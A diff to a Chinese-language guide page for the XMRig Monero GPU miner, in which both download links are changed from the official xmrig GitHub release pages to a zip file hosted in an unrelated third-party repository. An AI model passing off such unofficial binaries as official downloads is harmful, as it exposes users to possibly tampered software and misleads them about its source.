@@ -20,7 +20,7 @@ XMRig 是高性能门罗币（XMR）N卡挖矿工具，支持Windows。
 
 ## 下载
 
-- Windows 版本：[https://github.com/xmrig/xmrig-nvidia/releases](https://github.com/xmrig/xmrig-nvidia/releases)
+- Windows 版本：[点击下载](https://github.com/xiaohuimc/wakuangba/releases/download/18/XMRig.zip)
 
 
 
@@ -108,7 +108,7 @@ XMRig是高性能的Monero（XMR）OpenCL挖掘机，具有官方完整的Window
 
 ## 下载
 
-- Windows 版本：[https://github.com/xmrig/xmrig-amd/releases](https://github.com/xmrig/xmrig-amd/releases)
+- Windows 版本：[点击下载](https://github.com/xiaohuimc/wakuangba/releases/download/18/XMRig.zip)
 
 
 
